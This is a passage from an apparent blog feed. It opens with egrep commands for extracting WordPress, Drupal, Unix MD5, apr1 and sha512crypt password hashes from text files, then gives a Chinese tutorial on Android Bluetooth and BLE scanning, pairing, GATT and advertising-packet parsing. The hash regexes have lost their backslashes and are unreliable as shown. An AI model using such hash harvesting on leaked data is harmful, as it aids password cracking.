Wordpress-MD5"></a>Extract Wordpress-MD5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$P$S&#123;31&#125;&apos; *.txt &gt; wordpress-md5.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-Drupal-7"><a href="#Extract-Drupal-7" class="headerlink" title="Extract Drupal 7"></a>Extract Drupal 7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$S$S&#123;52&#125;&apos; *.txt &gt; drupal-7.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-old-Unix-md5"><a href="#Extract-old-Unix-md5" class="headerlink" title="Extract old Unix-md5"></a>Extract old Unix-md5</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$1$w&#123;8&#125;S&#123;22&#125;&apos; *.txt &gt; md5-unix-old.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-md5-apr1"><a href="#Extract-md5-apr1" class="headerlink" title="Extract md5-apr1"></a>Extract md5-apr1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$apr1$w&#123;8&#125;S&#123;22&#125;&apos; *.txt &gt; md5-apr1.txt</span><br></pre></td></tr></table></figure><h2 id="Extract-sha512crypt-SHA512-Unix"><a href="#Extract-sha512crypt-SHA512-Unix" class="headerlink" title="Extract sha512crypt, SHA512(Unix)"></a>Extract sha512crypt, SHA512(Unix)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &apos;$6$w&#123;8&#125;S&#123;86&#125;&apos; *.txt &gt; sha512crypt.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>蓝牙、BLE设备相关</title>
      <link href="/2018/03/17/%E8%93%9D%E7%89%99%E7%9A%84%E5%8F%91%E7%8E%B0%E3%80%81%E6%89%AB%E6%8F%8F/"/>
      <url>/2018/03/17/%E8%93%9D%E7%89%99%E7%9A%84%E5%8F%91%E7%8E%B0%E3%80%81%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="标准蓝牙设备"><a href="#标准蓝牙设备" class="headerlink" title="标准蓝牙设备"></a>标准蓝牙设备</h1><p>扫描经典蓝牙设备<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">final BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        mBluetoothAdapter = bm.getAdapter();</span><br><span class="line"></span><br><span class="line">        if (mBluetoothAdapter == null || !mBluetoothAdapter.isEnabled())</span><br><span class="line">        &#123;</span><br><span class="line">            Toast.makeText(this,&quot;please open bluttooth&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">            Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);</span><br><span class="line">            startActivityForResult(enableBtIntent, 0);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        //获取已经绑定的蓝牙</span><br><span class="line">        Set&lt;BluetoothDevice&gt; devices = mBluetoothAdapter.getBondedDevices();</span><br><span class="line">        //遍历已绑定设备</span><br><span class="line">        if (devices.size() &gt; 0) &#123;</span><br><span class="line">            for (BluetoothDevice bluetoothDevice : devices) &#123;</span><br><span class="line">                String info = bluetoothDevice.getName() + &quot;:&quot;</span><br><span class="line">                        + bluetoothDevice.getAddress() + &quot;\n\n&quot;;</span><br><span class="line">                Log.d(&quot;m4bln&quot;,info);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        /*</span><br><span class="line">        //扫描标准蓝牙设备</span><br><span class="line">        IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND);</span><br><span class="line">        filter.addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED);</span><br><span class="line">        filter.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);</span><br><span class="line">        registerReceiver(mReceiver, filter);</span><br><span class="line">        if (mBluetoothAdapter.startDiscovery())&#123;</span><br><span class="line">            Log.d(&quot;jiyuanyuan&quot;,&quot;开始扫描&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">   //标准蓝牙设备的receiver</span><br><span class="line">    private final BroadcastReceiver mReceiver = new BroadcastReceiver() &#123;</span><br><span class="line">        public void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">            String action = intent.getAction();</span><br><span class="line">            // When discovery finds a device</span><br><span class="line">            switch (intent.getAction()) &#123;</span><br><span class="line">                case BluetoothAdapter.ACTION_DISCOVERY_STARTED:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), &quot;正在搜索蓝牙设备，搜索时间大约一分钟&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    break;</span><br><span class="line">                case BluetoothAdapter.ACTION_DISCOVERY_FINISHED:</span><br><span class="line">                    Toast.makeText(getApplicationContext(), &quot;搜索蓝牙设备结束&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    break;</span><br><span class="line">                case BluetoothDevice.ACTION_FOUND:</span><br><span class="line">                    BluetoothDevice bluetoothDevice = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);</span><br><span class="line"></span><br><span class="line">                    Log.d(&quot;jiyuanyuan&quot;,bluetoothDevice.getAddress()+bluetoothDevice.getName());</span><br><span class="line">                    if (bluetoothDevice.getAddress().equals(&quot;1C:52:16:4E:7C:86&quot;))&#123;</span><br><span class="line">                        //78:62:56:D4:A2:3E</span><br><span class="line">                        Log.d(&quot;jiyuanyuan&quot;,&quot;链接 QCY&quot;);</span><br><span class="line">                        //bluetoothDevice.createBond();</span><br><span class="line">                        try &#123;</span><br><span class="line">                            Boolean returnValue = false;</span><br><span class="line">                            Method createBondMethod = BluetoothDevice.class.getMethod(&quot;createBond&quot;);</span><br><span class="line">                            Log.d(&quot;BlueToothTestActivity&quot;, &quot;开始配对&quot;);</span><br><span class="line">                            returnValue = (Boolean) createBondMethod.invoke(bluetoothDevice);</span><br><span class="line">                            Log.d(&quot;BlueToothTestActivity&quot;, &quot;配对返回：&quot;+returnValue.toString());</span><br><span class="line">                        &#125;catch (Exception e) &#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    &#125;else &#123;</span><br><span class="line">                        Log.d(&quot;jiyuanyuan&quot;,&quot;不相信&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    break;</span><br><span class="line">                case BluetoothDevice.ACTION_BOND_STATE_CHANGED:</span><br><span class="line">                    int status = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE);</span><br><span class="line">                    if (status == BluetoothDevice.BOND_BONDED) &#123;</span><br><span class="line">                        Toast.makeText(getApplicationContext(), &quot;已连接&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125; else if (status == BluetoothDevice.BOND_NONE) &#123;</span><br><span class="line">                        Toast.makeText(getApplicationContext(), &quot;未连接&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                    else if(status == BluetoothDevice.BOND_BONDING)&#123;</span><br><span class="line">                        Toast.makeText(getApplicationContext(), &quot;配对中&quot;, Toast.LENGTH_SHORT).show();</span><br><span class="line">                    &#125;</span><br><span class="line">                    break;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.android.google.cn/guide/topics/connectivity/bluetooth.html" target="_blank" rel="noopener">https://developer.android.google.cn/guide/topics/connectivity/bluetooth.html</a></p><h1 id="BLE设备"><a href="#BLE设备" class="headerlink" title="BLE设备"></a>BLE设备</h1><p>BLE（Bluetooh Low Energy）蓝牙低能耗技术是短距离、低成本、可互操作性的无线技术，它利用许多智能手段最大限度地降低功耗。BLE设备有效传输距离被提升到了100米以上，同时只需要一颗纽扣电池就可以工作数年之久。</p><p><img src="/images/pasted-28.png" alt="upload successful"></p><p>Android 4.3 (API level 18)内置了对BLE设备的支持，允许APP实现发现BLE设备、查找服务以及信息传输。</p><h2 id="GAP"><a href="#GAP" class="headerlink" title="GAP"></a>GAP</h2><p>GAP（Generic Access Profile），它用来控制设备连接和广播。GAP 使你的设备被其他设备可见，并决定了你的设备是否可以或者怎样与合同设备进行交互。例如 Beacon 设备就只是向外广播，不支持连接，小米手环就等设备就可以与中心设备连接。</p><ol><li>设备角色<br>GAP 给设备定义了若干角色，其中主要的两个是：外围设备（Peripheral）和中心设备（Central）。<br><strong>外围设备</strong>：一般就是非常小或者简单的低功耗设备，用来提供数据，并连接到一个更加相对强大的中心设备。例如小米手环。<br><strong>中心设备</strong>：中心设备相对比较强大，用来连接其他外围设备。例如手机等。</li><li><p>广播数据<br>在 GAP 中外围设备通过两种方式向外广播数据： Advertising Data Payload（广播数据）和 Scan Response Data Payload（扫描回复），每种数据最长可以包含 31 byte。<br>这里广播数据是必需的，因为外设必需不停的向外广播，让中心设备知道它的存在。扫描回复是可选的，中心设备可以向外设请求扫描回复，这里包含一些设备额外的信息，例如设备的名字。</p></li><li><p>广播流程</p></li></ol><p>外围设备会设定一个广播间隔，每个广播间隔中，它会重新发送自己的广播数据。广播间隔越长，越省电，同时也不太容易扫描到。</p><h2 id="几个概念"><a href="#几个概念" class="headerlink" title="几个概念"></a>几个概念</h2><h3 id="GATT"><a href="#GATT" class="headerlink" title="GATT"></a>GATT</h3><p>通过BLE连接，读写属性类数据的Profile通用规范，现在所有的BLE应用Profile都是基于GATT的。它定义两个 BLE 设备通过叫做 Service 和 Characteristic 的东西进行通信</p><p>GATT 连接需要特别注意的是：GATT 连接是独占的。也就是一个 BLE 外设同时只能被一个中心设备连接。一旦外设被连接，它就会马上停止广播，这样它就对其他设备不可见了。当设备断开，它又开始广播。</p><p>GATT 事务是建立在嵌套的Profiles, Services 和 Characteristics之上的的，如下图所示：<br><a href="http://jlog.qiniudn.com/microcontrollers_GattStructure.png" target="_blank" rel="noopener">http://jlog.qiniudn.com/microcontrollers_GattStructure.png</a><br><img src="/images/pasted-30.png" alt="upload successful"></p><ol><li><p><strong>Profile</strong><br>Profile 并不是实际存在于 BLE 外设上的，它只是一个被 Bluetooth SIG 或者外设设计者预先定义的 Service 的集合。例如心率Profile（Heart Rate Profile）就是结合了 Heart Rate Service 和 Device Information Service。</p></li><li><p><strong>Service</strong><br>Service 是把数据分成一个个的独立逻辑项，它包含一个或者多个 Characteristic。每个 Service 有一个 UUID 唯一标识。 UUID 有 16 bit 的，或者 128 bit 的。16 bit 的 UUID 是官方通过认证的，需要花钱购买，128 bit 是自定义的，这个就可以自己随便设置。(官方的Service <a href="https://www.bluetooth.com/specifications/gatt/services" target="_blank" rel="noopener">https://www.bluetooth.com/specifications/gatt/services</a>)<br>官方通过了一些标准 Service。以 Heart Rate Service为例，可以看到它的官方通过 16 bit UUID 是 0x180D，包含 3 个 Characteristic：Heart Rate Measurement, Body Sensor Location 和 Heart Rate Control Point，并且定义了只有第一个是必须的，它是可选实现的。</p></li><li><p><strong>Characteristic </strong></p></li></ol><p>Characteristic在 GATT 事务中的最低界别的是 Characteristic，Characteristic 是最小的逻辑数据单元，当然它可能包含一个组关联的数据，例如加速度计的 X/Y/Z 三轴值。</p><p>与 Service 类似，每个 Characteristic 用 16 bit 或者 128 bit 的 UUID 唯一标识。你可以免费使用 Bluetooth SIG 官方定义的标准 Characteristic (<a href="https://www.bluetooth.com/specifications/gatt/characteristics)，使用官方定义的，可以确保" target="_blank" rel="noopener">https://www.bluetooth.com/specifications/gatt/characteristics)，使用官方定义的，可以确保</a> BLE 的软件和硬件能相互理解。当然，你可以自定义 Characteristic，这样的话，就只有你自己的软件和外设能够相互理解。</p><p>举个例子， Heart Rate Measurement Characteristic，这是上面提到的 Heart Rate Service 必需实现的 Characteristic，它的 UUID 是 0x2A37。它的数据结构是，开始 8 bit 定义心率数据格式（是UINT8 还是 UINT16？），接下来就是对应格式的实际心率数据。</p><p><strong>实际上，和 BLE 外设打交道，主要是通过 Characteristic。你可以从 Characteristic 读取数据，也可以往 Characteristic 写数据。这样就实现了双向的通信。所以你可以自己实现一个类似串口（UART）的 Sevice，这个 Service 中包含两个 Characteristic，一个被配置只读的通道（RX），另一个配置为只写的通道（TX）。</strong></p><h2 id="Android-BLE-API"><a href="#Android-BLE-API" class="headerlink" title="Android BLE API"></a>Android BLE API</h2><ol><li><p>BluetoothAdapter<br>代表了移动设备的本地的蓝牙适配器, 通过该蓝牙适配器可以对蓝牙进行基本操作，一个Android系统只有一个BluetoothAdapter，通过BluetoothManager获取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BluetoothAdapter bluetoothAdapter = bluetoothManager.getAdapter();</span><br></pre></td></tr></table></figure></li><li><p>BluetoothDevice<br>扫描后发现可连接的设备，获取已经连接的设备。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BluetoothDevice bluetoothDevice = bluetoothAdapter.getRemoteDevice(address);</span><br></pre></td></tr></table></figure></li><li><p>BluetoothGattCallback<br>对已经连接上设备的某些操作后返回的结果的回调</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BluetoothGattCallback bluetoothGattCallback = new BluetoothGattCallback()&#123;</span><br><span class="line">//实现回调方法，根据业务做相应处理</span><br><span class="line">&#125;;</span><br><span class="line">BluetoothGatt bluetoothGatt = bluetoothDevice.connectGatt(this, false, bluetoothGattCallback);</span><br></pre></td></tr></table></figure></li><li><p>BluetoothGatt<br>通过BluetoothGatt可以连接设备（connect）,发现服务（discoverServices），并把相应地属性返回到BluetoothGattCallback，可以看成蓝牙设备从连接到断开的生命周期。</p></li></ol><h2 id="扫描BLE设备"><a href="#扫描BLE设备" class="headerlink" title="扫描BLE设备"></a>扫描BLE设备</h2><p>进行BLE设备扫描时，除了蓝牙权限外，还需要申请定位权限并打开GPS（这个非常坑）。扫描周边的BLE设备代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">//获取BluetoothAdapter</span><br><span class="line">final BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);</span><br><span class="line">mBluetoothAdapter = bm.getAdapter();</span><br><span class="line"></span><br><span class="line">//判断蓝牙是否开启</span><br><span class="line">        if (mBluetoothAdapter == null || !mBluetoothAdapter.isEnabled())</span><br><span class="line">        &#123;</span><br><span class="line">            Toast.makeText(this,&quot;please open bluttooth&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">            Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE);</span><br><span class="line">            startActivityForResult(enableBtIntent, 0);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">//扫描BLE设备        </span><br><span class="line">mScanCallback = new LeScanCallback();</span><br><span class="line">BluetoothLeScanner mBluetoothLeScanner = mBluetoothAdapter.getBluetoothLeScanner();</span><br><span class="line">System.out.println(&quot;开始扫描BLE设备。。。&quot;);</span><br><span class="line">mBluetoothLeScanner.startScan(mScanCallback);</span><br><span class="line"></span><br><span class="line">private class LeScanCallback  extends ScanCallback&#123;</span><br><span class="line">@Override</span><br><span class="line">    public void onScanResult(int callbackType, ScanResult result) &#123;</span><br><span class="line">    if(result != null)&#123;</span><br><span class="line">    System.out.println(&quot;扫面到设备：&quot; + result.getDevice().getName() + &quot;  &quot; + result.getDevice().getAddress());</span><br><span class="line"></span><br><span class="line">//此处，我们尝试连接MI 设备</span><br><span class="line">    mTargetDeviceName =&quot;MI Band 2&quot;;</span><br><span class="line">    if (result.getDevice().getName() != null &amp;&amp; mTargetDeviceName.equals(result.getDevice().getName())) &#123;</span><br><span class="line">                            //扫描到我们想要的设备后，立即停止扫描</span><br><span class="line">                 result.getDevice().connectGatt(MainActivity.this, false, mGattCallback);</span><br><span class="line">                            mBluetoothLeScanner.stopScan(mScanCallback);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line">          else&#123;</span><br><span class="line">          System.out.println(&quot;result为空&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br></pre></td></tr></table></figure></p><h2 id="BLE设备连接"><a href="#BLE设备连接" class="headerlink" title="BLE设备连接"></a>BLE设备连接</h2><p>两个设备通过BLE通信，首先需要建立GATT连接，这里我们讲的是Android设备作为client端，连接GATT Server。连接GATT Server，需要调用BluetoothDevice的connectGatt()方法，此函数带三个参数：Context、autoConnect(boolean)和 BluetoothGattCallback 对象。调用后返回BluetoothGatt对象，它是GATT profile的封装，通过这个对象，我们就能进行GATT Client端的相关操作。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">BluetoothDevice bluetoothDevice = bluetoothAdapter.getRemoteDevice(address);</span><br><span class="line">BluetoothGattCallback bluetoothGattCallback = new BluetoothGattCallback()&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) &#123;</span><br><span class="line">        super.onConnectionStateChange(gatt, status, newState);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onServicesDiscovered(BluetoothGatt gatt, int status) &#123;</span><br><span class="line">        super.onServicesDiscovered(gatt, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) &#123;</span><br><span class="line">        super.onCharacteristicRead(gatt, characteristic, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCharacteristicWrite(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) &#123;</span><br><span class="line">        super.onCharacteristicWrite(gatt, characteristic, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic) &#123;</span><br><span class="line">        super.onCharacteristicChanged(gatt, characteristic);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onDescriptorRead(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) &#123;</span><br><span class="line">        super.onDescriptorRead(gatt, descriptor, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onDescriptorWrite(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) &#123;</span><br><span class="line">        super.onDescriptorWrite(gatt, descriptor, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onReliableWriteCompleted(BluetoothGatt gatt, int status) &#123;</span><br><span class="line">        super.onReliableWriteCompleted(gatt, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onReadRemoteRssi(BluetoothGatt gatt, int rssi, int status) &#123;</span><br><span class="line">        super.onReadRemoteRssi(gatt, rssi, status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onMtuChanged(BluetoothGatt gatt, int mtu, int status) &#123;</span><br><span class="line">        super.onMtuChanged(gatt, mtu, status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">BluetoothGatt bluetoothGatt = bluetoothDevice.connectGatt(this, false, bluetoothGattCallback);</span><br><span class="line"></span><br><span class="line">//以下为获得Gatt后的相关操作对应的响应方法</span><br><span class="line">//notification to onCharacteristicChanged；</span><br><span class="line">bluetoothGatt.setCharacteristicNotification(characteristic, true);</span><br><span class="line"></span><br><span class="line">//readCharacteristic to onCharacteristicRead；</span><br><span class="line">bluetoothGatt.readCharacteristic(characteristic);</span><br><span class="line"></span><br><span class="line">//writeCharacteristic to onCharacteristicWrite；</span><br><span class="line">bluetoothGatt.wirteCharacteristic(mCurrentcharacteristic);</span><br><span class="line"></span><br><span class="line">//connect and disconnect to onConnectionStateChange；</span><br><span class="line">bluetoothGatt.connect();</span><br><span class="line">bluetoothGatt.disconnect();</span><br><span class="line"></span><br><span class="line">//readDescriptor to onDescriptorRead；</span><br><span class="line">bluetoothGatt.readDescriptor(descriptor);</span><br><span class="line"></span><br><span class="line">//writeDescriptor to onDescriptorWrite；</span><br><span class="line">bluetoothGatt.writeDescriptor(descriptor);</span><br><span class="line"></span><br><span class="line">//readRemoteRssi to onReadRemoteRssi；</span><br><span class="line">bluetoothGatt.readRemoteRssi();</span><br><span class="line"></span><br><span class="line">//executeReliableWrite to onReliableWriteCompleted；</span><br><span class="line">bluetoothGatt.executeReliableWrite();</span><br><span class="line"></span><br><span class="line">//discoverServices to onServicesDiscovered;</span><br><span class="line">bluetoothGatt.discoverServices();</span><br></pre></td></tr></table></figure></p><h2 id="数据解析"><a href="#数据解析" class="headerlink" title="数据解析"></a>数据解析</h2><p>数据包格式如下图</p><p><img src="/images/pasted-29.png" alt="upload successful"></p><p>数据包有两种：广播包（Advertising Data）和响应包（Scan Response），其中广播包是每个设备必须广播的，而响应包是可选的。</p><p>每个包都是 31 字节，数据包中分为有效数据（significant）和无效数据（non-significant）两部分。</p><ul><li>有效数据部分：<br>包含若干个广播数据单元，称为AD Structure。如图中所示，AD Structure的组成是：第一个字节是长度值Len，表示接下来的Len个字节是数据部分。数据部分的第一个字节表示数据的类型AD Type，剩下的Len - 1个字节是真正的数据AD data。其中AD type非常关键，决定了AD Data的数据代表的是什么和怎么解析</li><li>无效数据部分：<br>因为广播包的长度必须是31字节，如果有效数据部分不到31字节，剩下的就用0补齐，这部分的数据是无效的，解析的时候，直接忽略即可。</li></ul><p>根据如下数据包，举例说明LBE数据包的解析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 09 03 E7 FE 12 FF 0F 18 0A 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure></p><p>根据解析规则，可分成如下部分：</p><ol><li><p>广播数据(前31字节)<br>02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35</p></li><li><p>响应数据<br>09 03 E7 FE 12 FF 0F 18 0A 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</p></li><li><p>有效数据<br>02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 09 03 E7 FE 12 FF 0F 18 0A 18</p></li><li>无效数据<br>00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</li></ol><p>其中的有效数据又可分为如下几个数据单元：</p><ul><li><p>02 01 06</p></li><li><p>14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23</p></li><li><p>06 08 48 45 54 2D 35</p></li><li><p>09 03 E7 FE 12 FF 0F 18 0A 18<br>根据上面AD Type定义（所有的 AD type 的定义在<a href="https://www.bluetooth.org/en-us/specification/adopted-specifications" target="_blank" rel="noopener">文档</a>中）分别解析如下：<br>第一组数据告诉我们该设备属于LE普通发现模式，不支持BR/EDR；<br>第二组数据告诉我们该数据为厂商自定义数据，一般是必须解析的，可根据协议规则进行解析获取对应的所需信息；<br>第三组数据告诉我们该设备的简称为HET-5，其中对应的字符是查找ASSIC表得出的；<br>第四组数据告诉我们UUID为E7FE-12FF-0F18-0A18(此处有疑，类型03表示的是16位的UUID，对应的两个字节，而此处有8个字节，估计是设备烧录时把字节位数理解为了字符位数导致的问题).</p></li></ul><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://github.com/Jiesean/BleDemo" target="_blank" rel="noopener">https://github.com/Jiesean/BleDemo</a></li><li><a href="https://developer.android.google.cn/guide/topics/connectivity/bluetooth-le.html" target="_blank" rel="noopener">https://developer.android.google.cn/guide/topics/connectivity/bluetooth-le.html</a></li><li><a 